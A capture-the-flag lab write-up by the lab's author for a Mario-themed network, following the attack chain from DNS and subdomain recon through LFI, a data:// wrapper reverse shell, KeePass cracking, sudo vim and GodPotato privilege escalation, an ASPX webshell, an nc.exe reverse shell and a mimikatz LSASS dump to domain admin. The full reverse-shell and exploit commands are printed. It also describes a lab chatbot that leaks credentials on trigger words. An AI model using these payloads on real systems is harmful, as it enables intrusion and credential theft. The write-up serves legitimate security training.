# Writeup - Mushroom Kingdom

Jeremy Diaz - Lab author "Mushroom Kingdom"

![](img/Schema_infra_Mushroom_Kingdom.svg)

---
## 1. Enumeration

```bash
nmap -p- -A "$IP"
```

![](img/Pasted_image_20261006101913.png)

```
22/tcp   open  ssh
80/tcp   open  http
5353/udp open  domain
```

Port 80/tcp only serves the default page "Thank you Mario!" with nothing useful.

![](img/Pasted_image_20261006101945.png)

Standard port 53 does not respond, it is intercepted by the network infrastructure. The real DNS listens on 5353.

PTR lookup on the known IP to find the domain name:

```bash
dig -x "$IP" -p 5353 @"$IP"
```

![](img/Pasted_image_20261006102107.png)

We can now add `mushroomkingdom.local` to our `/etc/hosts`

```bash
echo "$IP forum.mushroomkingdom.local" | sudo tee -a /etc/hosts
```

Subdomain enumeration:
```bash
ffuf -w `fzf-wordlists`:FUZZ -u http://"mushroomkingdom.local"/ -H "Host: FUZZ.mushroomkingdom.local" -fs 894
```

![](img/Pasted_image_20261006102604.png)

--- 

This is where the story begins,

Upon entering the site, we discover the official forum of _the Mushroom Kingdom._ Here we find Peach, Mario, Luigi, Toad and all the kingdom's inhabitants sharing quests, alerts and the latest news from the castle.

![](img/Pasted_image_20261006102956.png)

Reading through the forum posts, we realize our mission is to save Princess Peach

![](img/Pasted_image_20261006103127.png)

---

Credentials are placed in one of the forum threads, these are honeypots
![](img/Pasted_image_20261006103557.png)

At the bottom right of the page there is a "need help" button
![](img/Pasted_image_20261006103403.png)

We find a chatbot. Its responses are pre-defined
![](img/Pasted_image_20261006103344.png)

However, when you say the word *flag* or *account* it leaks credentials to log into the website

![](img/Pasted_image_20261006105449.png)

There is another intentional way to find these credentials to prevent guessing, they are in plaintext in the JS scripts along with all of its leaked prompts
![](img/Pasted_image_20261008145929.png)

---

Now, LFI is possible from the search bar

![](img/Pasted_image_20261006114742.png)

---
## 3. RCE via data:// wrapper

A classic LFI also accepts PHP wrappers, not just file paths. I test `php://filter` on the server's PHP config:

```
php://filter/convert.base64-encode/resource=/etc/php/8.3/apache2/php.ini
```

![](img/Pasted_image_20261006162816.png)

We discover that:

```
allow_url_include = On
```

![](img/Pasted_image_20261006162958.png)

I generate a payload and inject it

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote(\"bash -c 'bash -i >& /dev/tcp/10.21.71.211/4444 0>&1'\"))"
```

```apache
bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.21.71.211/4444%200%3E%261%27
```

Start a listener:
```bash
rlwrap nc -lvnp 4444
```

I paste the URL in the address bar, with the base64 payload in `q` and the URL-encoded reverse shell command in `cmd`:

```apache
http://forum.mushroomkingdom.local/index.php?view=forum&q=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.21.71.211/4444%200%3E%261%27
```

![](img/Pasted_image_20261006163351.png)

---
## 4. Linux Privesc, root on TOAD

Exploring the system with my `www-data` shell, I find a forgotten KeePass file in `/var/backups`:

```bash
ls -la /var/backups/keepass-backup.kdbx
```

We transfer this file to the attacking machine and try to crack it

```bash
keepass2john keepass-backup.kdbx > hash.txt
john hash.txt --wordlist=rockyou.txt
```

![](img/Pasted_image_20261007102955.png)

The crack worked, the password is: `princess1`, so I can open the file. Inside, there are dozens of credentials.

![](img/Pasted_image_20261007103416.png)

Only the user toadette is active on the machine, let's try the credentials found in the KeePass vault
![](img/Pasted_image_20261007103604.png)

I switch to this account from my shell:

```bash
su toadette
```

When becoming toadette, `vim` opens instantly instead of a prompt. A vim escape is required just to get a usable shell:

```
:set shell=/bin/sh
:shell
```

![](img/Pasted_image_20261007105906.png)

```
sudo -l
```

```
User toadette may run the following commands on TOAD-MUSHROOM:
    (root) NOPASSWD: /usr/bin/vim
```

`vim` with passwordless sudo, classic GTFOBins:

```bash
sudo vim -c ':!/bin/sh'
```

I am root
```
uid=0(root) gid=0(root) groups=0(root)
```

We find a message in `/root` giving us credentials to enter Bowser's network

![](img/Pasted_image_20261007112143.png)

---

## 5. Pivot to KOOPALINGS-CASTLE

Now we need to access the Koopalings' machine, they guard the castle to prevent access to Bowser's dungeon.

Their intranet was coded in a weekend by Lemmy's cousin, who never heard of upload validation...

Meanwhile, Bowser's system administrator (`bowser_admin`) comes every month to do maintenance on the Koopalings' PC and always forgets to check that his credentials are not lingering in memory.

The default password mentioned above is logically `Welcome`, followed by the current year:

```
Welcome2026
```

From my root shell:

![](img/Pasted_image_20261007115005.png)

Ping sweep of the `/24`. Parentheses around the loop prevent job control notifications from the interactive shell that pollute the output:
```bash
( for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i &>/dev/null && echo "10.10.20.$i up") & done; wait )
```

![](img/Pasted_image_20261007120543.png)

Two machines respond. Rather than scanning from TOAD, I pivot with Ligolo-ng to scan directly from my attacking machine:

```bash
nmap -sV 10.10.20.0/24
```

```accesslog
10.10.20.20  80/tcp open http    KOOPALINGS-CASTLE, IIS
10.10.20.30  445,389,88 open    DC-BOWSER-KINGDOM, AD DS
```

---
## 6. RCE on KOOPALINGS-CASTLE, unrestricted upload

The HTTP port leads to Bowser's intranet
![](img/Pasted_image_20261007142532.png)

We quickly find an upload page "Castle File Drop" at `/upload.aspx`, it accepts any file without extension validation:

![](img/Pasted_image_20261007142851.png)

I upload an `.aspx` file to the site
![](img/Pasted_image_20261007143731.png)

![](img/Pasted_image_20261007143757.png)

At `/uploads/webshell.aspx`, I am now `svc_bowser_jr`

![](img/Pasted_image_20261007143824.png)

```
mushroomkingdom\svc_bowser_jr
```

---
## 7. Windows Privesc SYSTEM via SeImpersonatePrivilege

```powershell
whoami /priv
```

![](img/Pasted_image_20261007150221.png)

`svc_bowser_jr` inherits this privilege via `IIS_IUSRS` and is not a local admin, so classic potato attack.

I transfer the tool using a simple HTTP server on TOAD, which relays to the internal network:

```bash
cd /tmp && python3 -m http.server 8000
```

And `Invoke-WebRequest` on the KOOPALINGS side, from the webshell:

```powershell
powershell Invoke-WebRequest -Uri http://10.10.20.1:8080/GodPotato-NET4.exe -OutFile C:\Windows\Temp\GodPotato.exe
```

```powershell
C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"
```

![](img/Pasted_image_20261007153805.png)

I can start a listener on TOAD and trigger a reverse shell with

![](img/Pasted_image_20261007163014.png)
```bash
curl -G "http://127.0.0.1:8080/uploads/shell5.aspx" --data-urlencode 'cmd=C:\Windows\Temp\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.20.1 4446"'
```


---
## 8. LSASS Dump, cached credentials

WDigest is enabled, `UseLogonCredential=1`. A Domain Admin account, `bowser_admin`, regularly connects to this machine via a scheduled maintenance task, so his password remains in cleartext in memory.

```powershell
C:\Windows\Temp\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

```
Username : bowser_admin
Domain   : MUSHROOMKINGDOM
Password : visible in cleartext
```

---
## 9. Domain Admin, final flag

```bash
xfreerdp /u:bowser_admin /p:'<password>' /d:MUSHROOMKINGDOM /v:10.10.20.30
```

Flag on the desktop, `C:\Users\bowser_admin\Desktop\flag.txt`:

```
FLAG{s0rry_m4r10_y0ur_pr1nc3ss_1s_1n_4n0th3r_c4stl3}
```

---
## Attack chain summary

| Step | Vector | Result |
|---|---|---|
| Recon | PTR + subdomain bruteforce | discovery of `forum.mushroomkingdom.local` |
| LFI | search parameter `q` | arbitrary file read |
| Linux RCE | LFI + `data://` wrapper (allow_url_include) | `www-data` shell on TOAD |
| Linux Privesc | weak KeePass vault -> toadette -> sudo vim | root on TOAD |
| Pivot | `castle_access.txt` | `svc_bowser_jr` credentials |
| Windows RCE | unrestricted `.aspx` upload | shell on KOOPALINGS-CASTLE |
| Windows Privesc | `SeImpersonatePrivilege` + GodPotato | SYSTEM on KOOPALINGS-CASTLE |
| Cached credentials | WDigest, scheduled task | `bowser_admin` password in cleartext |
| Final compromise | RDP with `bowser_admin` | Domain Admin on `DC-BOWSER-KINGDOM` |
